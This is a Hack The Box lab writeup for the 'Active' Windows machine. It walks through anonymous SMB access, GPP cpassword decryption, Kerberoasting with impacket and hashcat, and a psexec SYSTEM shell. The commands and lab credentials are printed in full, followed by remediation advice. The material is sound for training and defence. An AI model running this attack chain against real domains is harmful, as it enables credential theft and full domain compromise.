# Active: Hack The Box Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen) ![OS](https://img.shields.io/badge/OS-Windows-blue) ![Category](https://img.shields.io/badge/Category-Active%20Directory-orange)

---

## Machine Information

| Attribute | Details |
|-----------|---------|
| Machine Name | Active |
| Difficulty | Easy |
| Platform | Hack The Box |
| Operating System | Windows Server 2008 R2 |
| IP Address | 10.129.73.116 |
| Domain | active.htb |

---

## Overview

This writeup documents the solution for the **Active** machine on Hack The Box, which demonstrates critical security failures in Active Directory Group Policy configuration and Kerberos authentication.

## Challenge Context

The Active machine illustrates the catastrophic risk of **exposing Group Policy Preferences (GPP) passwords** in SYSVOL shares and the dangers of **Kerberoastable service accounts** with weak passwords.

**Key Demonstration:**

Group Policy Preferences stored passwords using reversible encryption with a publicly known decryption key, allowing any domain user to extract privileged credentials from accessible file shares.

## Learning Objectives

This lab teaches:

- GPP password extraction from SYSVOL shares
- Understanding Group Policy security misconfigurations
- Kerberoasting attack methodology
- Authentication control validation in Active Directory
- Recognition of critical AD misconfigurations
- Real-world implications of legacy security vulnerabilities

**Scenario:** Discovery and exploitation of GPP password leakage combined with Kerberoasting attack against service accounts, leading to complete domain compromise.

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Initial Access: SMB Enumeration](#initial-access)
3. [Credential Extraction: GPP Decryption](#credential-extraction)
4. [Lateral Movement: Kerberoasting](#lateral-movement)
5. [Privilege Escalation: Domain Admin](#privilege-escalation)
6. [Flags](#flags)
7. [Key Takeaways](#key-takeaways)

---

## Reconnaissance

### Verify VPN Connectivity
```bash
ip a | grep tun0
```

**Expected Output:**
- Interface `tun0` exists
- IP in range `10.10.x.x`

⚠️ **Note:** If `tun0` is missing, reconnect to HTB VPN.

---

## Initial Access

### SMB Share Enumeration
```bash
smbclient -L //10.129.73.116/ -N
```

**Flags:**
- `-L`: List shares
- `-N`: No password (anonymous authentication)

**Result:**
```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
Replication     Disk      
SYSVOL          Disk      Logon server share
Users           Disk
```

✅ **Discovery:** `Replication` share is accessible anonymously

### Access Replication Share
```bash
smbclient //10.129.73.116/Replication -N
```

**Navigate to Groups.xml:**
```smb
smb: \> ls
smb: \> cd active.htb
smb: \active.htb\> cd Policies
smb: \active.htb\Policies\> cd {31B2F340-016D-11D2-945F-00C04FB984F9}
smb: \active.htb\Policies\{GUID}\> cd MACHINE
smb: \active.htb\Policies\{GUID}\MACHINE\> cd Preferences
smb: \active.htb\Policies\{GUID}\MACHINE\Preferences\> cd Groups
smb: \active.htb\Policies\{GUID}\MACHINE\Preferences\Groups\> get Groups.xml
smb: \active.htb\Policies\{GUID}\MACHINE\Preferences\Groups\> exit
```

---

## Credential Extraction

### Examine Groups.xml
```bash
cat Groups.xml
```

**Key Finding:**
```xml
<Properties 
    cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" 
    userName="active.htb\SVC_TGS" 
/>
```

### Decrypt GPP Password
```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

**Output:**
```
GP$stillStandingStrong2k18
```

✅ **Credentials Obtained:**
- **Username:** `SVC_TGS`
- **Password:** `GP$stillStandingStrong2k18`

### Verify Credentials
```bash
smbclient -L //10.129.73.116/ -U active.htb/SVC_TGS
```

**Password:** `GP$stillStandingStrong2k18`

✅ Authentication successful: credentials confirmed valid

---

## Lateral Movement

### Kerberoasting Attack

#### Failed Attempts (Common Errors)
```bash
# WRONG - Shell expansion breaks password
impacket-GetUserSPNs active.htb/SVC_TGS -p GP$stillStandingStrong2k18 -dc-ip 10.129.73.116

# WRONG - Missing DC IP
impacket-GetUserSPNs active.htb/SVC_TGS:'GP$stillStandingStrong2k18' -request

# WRONG - Wrong DC IP
impacket-GetUserSPNs active.htb/SVC_TGS:'GP$stillStandingStrong2k18' -dc-ip 10.10.14.15
```

**Common Errors:**
- `invalidCredentials` - Wrong syntax or shell expansion
- `No route to host` - Wrong DC IP
- `unrecognized arguments -p` - Incorrect parameter usage

#### Correct Command ✅
```bash
impacket-GetUserSPNs active.htb/SVC_TGS:'GP$stillStandingStrong2k18' -dc-ip 10.129.73.116 -request
```

**Key Points:**
- ⚠️ Use **inline credentials** with single quotes
- ⚠️ Do NOT use `-p` flag
- ⚠️ Password contains `$` which breaks shell expansion
- ⚠️ DC IP must be the target machine IP

**Output:**
```
ServicePrincipalName  Name           MemberOf
--------------------  -------------  --------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*[...very long hash...]
```

✅ **Discovery:** Administrator account is Kerberoastable

---

### Hash Extraction and Storage

#### Create Hash File
```bash
nano admin.tgs.hash
```

**⚠️ CRITICAL FORMATTING RULES:**
1. **ONE LINE ONLY**: No line breaks
2. **NO SPACES**: Copy exactly as shown
3. **NO EXTRA TEXT**: Only the hash

**Correct Format:**
```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c8f9e[...rest of hash...]d42a
```

**Verify Correct Format:**
```bash
cat admin.tgs.hash
```

Should print exactly one line.

---

### Hash Cracking with Hashcat

```bash
hashcat -m 13100 admin.tgs.hash /usr/share/wordlists/rockyou.txt
```

**Parameters:**
- `-m 13100`: Kerberos 5 TGS-REP (etype 23)
- Hash file: `admin.tgs.hash`
- Wordlist: `rockyou.txt`

**If hashcat exits immediately:**
```bash
hashcat -m 13100 admin.tgs.hash --show
```

**Result:**
```
$krb5tgs$23$*Administrator[...]:Ticketmaster1968
```

✅ **Administrator Credentials:**
- **Username:** `Administrator`
- **Password:** `Ticketmaster1968`

---

## Privilege Escalation

### WinRM Attempt (Expected Failure)
```bash
evil-winrm -i 10.129.73.116 -u Administrator -p 'Ticketmaster1968'
```

**Error:**
```
Error: An error of type Errno::ECONNREFUSED happened, message is Connection refused - Connection refused - connect(2) for "10.129.73.116" port 5985
```

**Explanation:**
- WinRM service (port 5985) is not enabled
- Ruby warning about OpenSSL is NOT the issue
- This is a Windows Server 2008 R2 machine

### PSExec: Correct Method ✅
```bash
impacket-psexec active.htb/Administrator:'Ticketmaster1968'@10.129.73.116
```

**Output:**
```
Impacket v0.x.x - Copyright 2023 SecureAuth Corporation

[*] Requesting shares on 10.129.73.116.....
[*] Found writable share ADMIN$
[*] Uploading file xxxxxxxx.exe
[*] Opening SVCManager on 10.129.73.116.....
[*] Creating service xxxx on 10.129.73.116.....
[*] Starting service xxxx.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

**Verify Privileges:**
```cmd
whoami
```

**Output:**
```
nt authority\system
```

✅ **SYSTEM shell obtained**

---

## Flags

### User Flag
```cmd
cd C:\Users\SVC_TGS\Desktop
type user.txt
```

**Flag:** `[redacted]`

### Root Flag
```cmd
cd C:\Users\Administrator\Desktop
type root.txt
```

**Flag:** `[redacted]`

---

## Attack Chain Summary

```
Anonymous SMB Access
        ↓
   Groups.xml File
        ↓
 GPP Password Leak (cpassword)
        ↓
  Domain User Credentials (SVC_TGS)
        ↓
    Kerberoasting
        ↓
 Administrator TGS Hash
        ↓
   Hashcat Cracking
        ↓
Domain Admin Credentials
        ↓
   PSExec Execution
        ↓
  NT AUTHORITY\SYSTEM
```

---

## Key Takeaways

### Technical Lessons

1. **GPP Password Storage Vulnerability**
   - Group Policy Preferences (GPP) stored passwords using reversible encryption
   - Microsoft published the decryption key in 2012
   - `cpassword` attribute in `Groups.xml` is always vulnerable
   - MS14-025 patched this, but legacy systems remain vulnerable

2. **Password Special Characters in Shells**
   - `$` character breaks bash variable expansion
   - **Solution:** Use single quotes or inline credentials
   - **Wrong:** `-p GP$stillStandingStrong2k18`
   - **Correct:** `'GP$stillStandingStrong2k18'`

3. **Kerberoasting Attack**
   - Service accounts with SPNs can be targeted
   - TGS tickets are encrypted with user's password hash
   - Offline cracking is possible with hashcat
   - **Mode 13100** for Kerberos 5 TGS-REP (etype 23)

4. **Hash Format Requirements**
   - Hashcat requires **exact formatting**
   - **ONE line only**: no breaks
   - `separator unmatched` error = formatting issue
   - Always verify with `cat` before cracking

5. **Remote Access Methods on Legacy Windows**
   - WinRM not always enabled on older systems
   - **PSExec** works via SMB (port 445)
   - Requires Admin$ share access
   - Creates service → runs command → deletes service

### Enumeration Best Practices

✅ **Do:**
- Always check anonymous SMB access
- Look for `SYSVOL`, `Replication`, `Scripts` shares
- Search for `.xml`, `.ini`, `.config` files
- Verify credentials immediately after obtaining them
- Use correct DC IP for Kerberos operations

❌ **Don't:**
- Assume WinRM is always available
- Ignore shell special characters in passwords
- Skip credential verification steps
- Use wrong IP addresses for domain operations
- Format hashes with multiple lines

### Tools Used

| Tool | Purpose | Key Flags |
|------|---------|-----------|
| `smbclient` | SMB share enumeration | `-L` (list), `-N` (no auth) |
| `gpp-decrypt` | Decrypt GPP passwords | N/A |
| `impacket-GetUserSPNs` | Kerberoasting | `-dc-ip`, `-request` |
| `hashcat` | Offline hash cracking | `-m 13100` (Kerberos) |
| `impacket-psexec` | Remote command execution | Requires admin creds |

---

## Remediation

### For Domain Administrators

1. **Remove GPP Passwords**
   ```powershell
   # Find all Groups.xml files
   Get-ChildItem -Path "C:\Windows\SYSVOL" -Recurse -Filter "Groups.xml"
   ```

2. **Disable Anonymous SMB Access**
   ```
   Network access: Let Everyone permissions apply to anonymous users = Disabled
   Network access: Restrict anonymous access to Named Pipes and Shares = Enabled
   ```

3. **Kerberoasting Mitigation**
   - Use long, complex passwords for service accounts (25+ characters)
   - Implement Managed Service Accounts (MSA/gMSA)
   - Monitor for TGS-REP requests for privileged accounts
   - Enable AES encryption for Kerberos (not RC4)

4. **Enable WinRM Securely (if needed)**
   ```powershell
   Enable-PSRemoting -Force
   Set-Item WSMan:\localhost\Service\Auth\Basic -Value $false
   ```

---

## References

- [MS14-025: GPP Vulnerability](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30)
- [Kerberoasting Without Mimikatz](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
- [Impacket Documentation](https://github.com/SecureAuthCorp/impacket)
- [Hashcat Wiki: Kerberos](https://hashcat.net/wiki/doku.php?id=example_hashes)

---

**Machine Pwned:** ✅  
**Difficulty Rating:** Easy (but teaches critical AD concepts)  
**Real-World Relevance:** High (GPP + Kerberoasting still common)
